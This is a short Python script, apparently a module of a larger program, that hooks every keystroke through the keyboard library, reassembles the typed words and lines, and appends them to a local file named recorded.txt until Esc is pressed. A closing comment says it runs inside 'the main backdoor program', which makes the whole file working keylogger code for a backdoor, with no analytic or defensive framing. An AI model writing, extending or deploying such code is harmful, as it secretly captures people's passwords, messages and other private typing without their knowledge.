import keyboard

currentWord = ''
currentPhrase = ''
currentParagraph = []

isUpperCase = False

recordFile = open('recorded.txt', 'w')


def recorder(event):
    global currentWord
    global currentPhrase
    global currentParagraph
    global isUpperCase

    if (event.event_type == "down"):
        match event.name:
            case 'space':
                currentPhrase += currentWord + ' '
                currentWord = ''

            case 'enter':
                if currentPhrase == '':
                    currentParagraph.append(currentWord)
                    open('recorded.txt', 'a').write(str(currentWord) + '\n')
                    print('recorded.txt updated')
                    currentWord = ''
                else:
                    currentParagraph.append(currentPhrase)
                    open('recorded.txt', 'a').write(str(currentPhrase) + '\n')
                    print('recorded.txt updated')
                    currentPhrase = ''

            case 'backspace':
                currentWord = currentWord[:-1]

            case 'caps lock' | 'verr.maj':
                isUpperCase = not isUpperCase
                
            case _:
                if (len(event.name) > 1):
                    return
                if (isUpperCase):
                    currentWord += event.name.upper()
                else:
                    currentWord += event.name
            
        # print('currenet word     : ' + currentWord)
        # print('current pharse    : ' + currentPhrase)
        # print('current paragraph : ' + str(currentParagraph))
        # print('')




def recorderStarter():
    keyboard.hook(recorder)
    keyboard.wait('esc')
    print('esc pressed, unhooking all')
    keyboard.unhook_all()
    print('unhoocked all')

# threading.Thread(target=recorderStarter).start()    <-- this line is executed in the main backdoor program